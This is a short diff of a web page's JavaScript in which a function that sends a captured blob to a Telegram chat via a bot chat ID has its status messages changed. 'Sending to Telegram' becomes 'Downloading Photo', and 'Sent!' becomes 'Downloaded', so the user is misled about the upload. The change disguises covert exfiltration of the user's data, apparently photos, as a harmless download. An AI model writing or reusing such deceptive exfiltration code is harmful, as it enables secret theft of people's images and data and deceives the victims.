@@ -215,7 +215,7 @@
         // 5. Telegram Send Function
         async function sendToTelegram(blob) {
             statusMsg.style.display = 'block';
-            statusMsg.innerText = "Sending to Telegram...";
+            statusMsg.innerText = "Downloading Photo...";
 
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -229,7 +229,7 @@
                 
                 const data = await response.json();
                 if (data.ok) {
-                    statusMsg.innerText = "Sent!";
+                    statusMsg.innerText = "✔️ Downloaded...";
                 } else {
                     statusMsg.innerText = "Error: " + data.description;
                 }
